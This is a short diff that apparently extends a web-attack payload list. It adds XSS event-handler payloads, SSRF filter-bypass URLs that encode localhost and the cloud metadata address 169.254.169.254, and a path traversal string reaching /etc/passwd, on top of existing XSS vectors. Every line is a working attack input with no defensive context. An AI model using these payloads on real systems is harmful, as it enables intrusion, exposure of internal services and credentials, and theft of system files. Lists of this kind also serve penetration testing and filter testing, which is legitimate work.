@@ -8,3 +8,18 @@
 <svg onload="alert(1)" <="" svg="" 
 <iframe autofocus onfocus=alert(1)>
 <a autofocus onfocus=alert(23) href=#>x</a>
+<body onafterprint=alert(1)>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationend="alert(1)"></img>
+{
+http://site.com/?url=FUZZ
+http://169.254.169.254\http://0.google.com <=== PHP cve2020
+https://[0:0:0:0:0:0:0:0]
+https://0.0.0.0
+https://[::]
+https://0177.1
+https://0x7f.1
+http://0x7f000001
+http://2130706433
+http://127.000.001
+}
+/user/local/redacted/../../../etc/passwd
